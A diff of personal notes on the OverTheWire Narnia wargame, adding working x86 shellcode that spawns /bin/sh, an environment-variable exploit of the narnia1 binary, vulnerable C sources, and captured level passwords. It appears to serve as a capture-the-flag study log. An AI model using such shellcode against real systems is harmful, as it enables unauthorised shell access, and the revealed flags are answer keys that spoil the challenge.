@@ -2,7 +2,7 @@
 
 - bufferoverflow with `scanf`: we can overwrite the stack if there is 
   discrepencies between array length and input (level0)
-- we can find shellcode at [exploit-db](https://www.exploit-db.com/shellcodes/50751)
+- we can find shellcode at [exploit-db](https://www.exploit-db.com/shellcodes/50751) or at [shell-storm](https://shell-storm.org/shellcode/index.html)
 
 
 ### Level 0
@@ -70,21 +70,57 @@ Flag: `eaa6AjYMBB`
 
 %% --------------------------------------------------- 
 
-### Level 1 -> Level 2
+### Level 1 -> Level 2 (REVIEW!! why do we use that particular shell code)
 
 Goal: Environment Exploit by setting shell code as EGG environment variable
 
+[Shell Code - How it works](https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/)
+[Shell Code](http://shell-storm.org/shellcode/files/shellcode-399.html)
 
 ```
 >>> ssh narnia1@narnia.labs.overthewire.org -p 2226
 
-shellcode used: "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80";
-"\x25\xa4\xff\xfd"
+shellcode:
 
+"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
+
+"\xeb\x0d\x5f\x31\xc0\x50\x89\xe2\x52\x57\x54\xb0\x3b\xcd\x80\xe8\xee\xff\xff\xff/bin/sh"
+
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80"              
+
+
+>>> cat narnia.c
+
+#include <stdio.h>
+
+int main(){
+    int (*ret)();
+
+    if(getenv("EGG")==NULL){
+        printf("Give me something to execute at the env-variable EGG\n");
+        exit(1);
+    }
+
+    printf("Trying to execute EGG!\n");
+    ret = getenv("EGG");
+    ret();
+
+    return 0;
+}
+
+>>> ./narnia1 
+Give me something to execute at the env-variable EGG
+
+>>> EGG=$(python2 -c 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
+>>> export EGG
+>>> ./narnia1
+
+>>> cat /etc/narnia_pass/narnia2
+Zzb6MIyceT
 
 ```
 
-Flag: ``
+Flag: `Zzb6MIyceT`
 
 %% --------------------------------------------------- 
 
@@ -95,6 +131,25 @@ Goal:
 
 ```
 >>> ssh narnia2@narnia.labs.overthewire.org -p 2226
+
+>>> cat narnia2.c
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main(int argc, char * argv[]){
+    char buf[128];
+
+    if(argc == 1){
+        printf("Usage: %s argument\n", argv[0]);
+        exit(1);
+    }
+    strcpy(buf,argv[1]);
+    printf("%s", buf);
+
+    return 0;
+}
 
 ```
 
